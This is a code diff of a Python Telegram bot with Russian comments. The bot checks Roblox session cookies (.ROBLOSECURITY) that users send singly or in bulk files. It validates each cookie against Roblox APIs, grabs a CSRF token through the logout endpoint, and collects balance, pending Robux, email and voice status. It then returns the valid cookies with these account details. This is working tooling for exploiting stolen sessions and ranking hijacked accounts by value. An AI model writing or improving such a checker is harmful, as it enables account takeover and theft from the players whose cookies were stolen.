@@ -17,87 +17,71 @@ def home(): return "Бот работает"
 def run(): app.run(host='0.0.0.0', port=8080)
 def keep_alive(): Thread(target=run).start()
 
-def get_detailed_stats(u_id, cookies, headers):
-    """Сбор данных с минимальным риском для куки"""
-    stats = {"age": 0, "voice": "Нет ❌", "pending": 0, "email": "❌", "rap": 0}
+def get_auth_data(cookies, headers):
+    """Один запрос для получения CSRF и проверки жизни куки"""
     try:
-        # Пендинг и Баланс (в одном запросе часто безопаснее)
-        summary = requests.get(
-            f"https://economy.roblox.com/v2/users/{u_id}/transaction-totals?timeFrame=Month&transactionType=Summary",
-            cookies=cookies, headers=headers, timeout=5
-        ).json()
-        stats["pending"] = summary.get('pendingRobux', 0)
-
-        # Почта
-        email_data = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies, headers=headers, timeout=5).json()
-        if email_data.get('verified'): stats["email"] = "Да ✅"
-
-        # Voice Chat
-        v_req = requests.get("https://voice.roblox.com/v1/settings/is-voice-enabled", cookies=cookies, headers=headers, timeout=5).json()
-        if v_req.get('isVoiceEnabled'): stats["voice"] = "Да ✅"
-
-        # RAP
-        inv = requests.get(f"https://inventory.roblox.com/v1/users/{u_id}/assets/collectibles?limit=100", cookies=cookies, headers=headers, timeout=5).json()
-        stats["rap"] = sum(item.get('recentAveragePrice', 0) for item in inv.get('data', []))
-    except: pass
-    return stats
-
-def extract_cookie(text):
-    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", text)
-    return match.group(1).strip() if match else None
+        # Пытаемся получить CSRF через запрос, который его требует
+        res = requests.post("https://auth.roblox.com/v2/logout", cookies=cookies, headers=headers)
+        return res.headers.get("x-csrf-token")
+    except: return None
 
 def check_cookie(raw_text):
-    cookie = extract_cookie(raw_text)
-    if not cookie: return {"status": "invalid"}
+    # Вытаскиваем куки из любого мусора
+    match = re.search(r"(_\|WARNING:-DO-NOT-SHARE-THIS\..+)", raw_text)
+    if not match: return {"status": "invalid"}
+    cookie = match.group(1).strip()
     
     cookies = {".ROBLOSECURITY": cookie}
-    # Имитируем заголовки мобильного приложения Roblox (они стабильнее)
     headers = {
-        "User-Agent": "RobloxApp/1.0 (iPhone; iOS 15.0; Scale/2.00)",
-        "Accept": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
         "Referer": "https://www.roblox.com/"
     }
     
     try:
-        # Главная проверка (Auth)
-        auth_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, headers=headers, timeout=10)
-        if auth_req.status_code != 200: return {"status": "invalid"}
-        
-        user_info = auth_req.json()
-        u_id, u_name = user_info['id'], user_info['name']
-        
-        # Основная инфа
-        profile = requests.get(f"https://users.roblox.com/v1/users/{u_id}", headers=headers).json()
-        created_dt = datetime.strptime(profile['created'], "%Y-%m-%dT%H:%M:%S.%fZ")
-        age = (datetime.now() - created_dt).days
-        
-        # Валюта
+        # 1. Проверка авторизации
+        u_req = requests.get("https://users.roblox.com/v1/users/authenticated", cookies=cookies, headers=headers, timeout=10)
+        if u_req.status_code != 200: return {"status": "invalid"}
+        u_id = u_req.json()['id']
+        u_name = u_req.json()['name']
+
+        # 2. Получаем CSRF (нужен для точных данных)
+        csrf = get_auth_data(cookies, headers)
+        if csrf: headers["X-CSRF-TOKEN"] = csrf
+
+        # 3. Сбор данных (Пендинг, Баланс, Почта, Войс)
+        # Баланс
         robux = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/currency", cookies=cookies, headers=headers).json().get('robux', 0)
         
-        # Расширенная инфа
-        adv = get_detailed_stats(u_id, cookies, headers)
-        
+        # Пендинг (Revenue Summary)
+        rev_res = requests.get(f"https://economy.roblox.com/v1/users/{u_id}/revenue/summary/30d", cookies=cookies, headers=headers).json()
+        pending = rev_res.get('pendingRobux', 0)
+
+        # Почта
+        email_v = "❌"
+        email_req = requests.get("https://accountsettings.roblox.com/v1/email", cookies=cookies, headers=headers).json()
+        if email_req.get('verified'): email_v = "✅"
+
+        # Войс
+        voice_v = "❌"
+        voice_req = requests.get("https://voice.roblox.com/v1/settings/is-voice-enabled", cookies=cookies, headers=headers).json()
+        if voice_req.get('isVoiceEnabled'): voice_v = "✅"
+
         return {
             "status": "ok", "name": u_name, "id": u_id, "robux": robux,
-            "age": age, "voice": adv["voice"], "pending": adv["pending"], 
-            "rap": adv["rap"], "email": adv["email"], "cookie": cookie
+            "pending": pending, "email": email_v, "voice": voice_v, "cookie": cookie
         }
-    except: return {"status": "error"}
+    except Exception as e:
+        print(f"Ошибка: {e}")
+        return {"status": "error"}
 
 def format_output(res):
     return (
         f"👤 Аккаунт: {res['name']} (ID: {res['id']})\n"
-        f"🎂 Возраст: {res['age']} дней\n"
         f"📧 Почта: {res['email']} | 🎤 Voice: {res['voice']}\n"
-        f"💰 Баланс: {res['robux']} R$ (+{res['pending']} Pending)\n"
-        f"💎 Ценность (RAP): {res['rap']} R$\n\n"
+        f"💰 Баланс: {res['robux']} R$ (+{res['pending']} Pending)\n\n"
         f"🍪 КУКИ:\n`{res['cookie']}`\n"
         f"{'='*30}\n"
     )
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "👋 Привет! Пришли куки или файл. Проверка стала безопаснее.")
 
 @bot.message_handler(content_types=['text', 'document'])
 def handle(message):
@@ -105,9 +89,9 @@ def handle(message):
         if message.content_type == 'text' and len(message.text) > 100:
             res = check_cookie(message.text)
             if res['status'] == 'ok':
-                bot.send_message(message.chat.id, format_output(res), parse_mode="Markdown")
+                bot.reply_to(message, format_output(res), parse_mode="Markdown")
             else:
-                bot.send_message(message.chat.id, "❌ Куки невалиден или заблокирован защитой.")
+                bot.reply_to(message, "❌ Невалидный куки.")
         
         elif message.content_type == 'document':
             file_info = bot.get_file(message.document.file_id)
@@ -118,16 +102,17 @@ def handle(message):
             results = []
             for l in lines:
                 res = check_cookie(l)
-                if res['status'] == 'ok': results.append(format_output(res))
+                if res['status'] == 'ok':
+                    results.append(format_output(res))
             
             if results:
                 buf = io.BytesIO("".join(results).encode('utf-8'))
-                buf.name = "results.txt"
+                buf.name = "checked.txt"
                 bot.send_document(message.chat.id, buf)
             else:
                 bot.send_message(message.chat.id, "❌ Валид не найден.")
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Ошибка в хендлере: {e}")
 
 if __name__ == '__main__':
     keep_alive()
